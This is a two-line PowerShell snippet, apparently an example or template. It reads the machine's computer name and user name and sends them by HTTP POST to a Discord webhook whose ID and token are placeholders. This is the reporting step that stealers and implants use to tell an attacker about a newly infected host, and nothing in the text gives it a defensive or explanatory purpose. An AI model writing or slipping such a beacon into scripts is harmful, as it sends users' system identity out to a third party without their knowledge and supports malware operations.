$info = "$env:COMPUTERNAME $env:USERNAME"
Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/000/xxx' -Method Post -Body (@{content=$info} | ConvertTo-Json)
